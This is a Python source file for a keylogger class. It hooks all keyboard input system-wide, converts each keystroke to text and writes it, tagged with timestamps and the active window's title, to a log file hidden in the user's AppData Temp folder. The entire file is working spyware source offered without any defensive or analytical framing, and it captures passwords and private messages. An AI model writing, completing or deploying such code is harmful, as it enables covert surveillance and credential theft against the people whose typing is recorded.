import keyboard, os
from keylogger.handler import Handler
from keylogger.converter import Converter
from keylogger.windowchecker import WindowChecker
from datetime import datetime


class Keylogger:
    def __init__(self) -> None:
        self.logfile = f'{os.path.expanduser('~')}\\AppData\\Local\\Temp\\keylogger.log'
        self.text = ""
        self.key_count = 0
        self.handler = Handler()
        self.converter = Converter()
        self.checker = WindowChecker()

    def log(self) -> None:
        with open(self.logfile, 'a') as log:
            text = self.format_text(self.text)
            try:
                log.write(text)
            except Exception as e:
                print(e)
                print(text)

    def format_text(self, text: str) -> str:

        def clean(string: str) -> str:
            return "".join(char for char in string if char.isprintable())

        if self.checker.switch_window():
            current_time = clean(datetime.now().strftime("%H:%M][%d.%m.%Y"))
            current_window = clean(self.checker.current_window)

            info = f'\n\n[{current_time}]\n[{current_window}]\n\n{text}'

            return info

        return text

    def main(self, event: keyboard.KeyboardEvent) -> None:

        self.handler.shift_handler(event)
        self.handler.main_handler(event)
        self.checker.check_window()

        if self.handler.key:
            self.text += self.converter.convert(self.handler.shift, self.handler.key)
            self.key_count += 1
            self.handler.key = None

            if self.checker.switch_window() or self.key_count == 1:
                self.log()
                self.text = ""
                self.key_count = 0

    def start(self) -> None:
        self.log()
        keyboard.hook(callback=self.main)
        keyboard.wait()
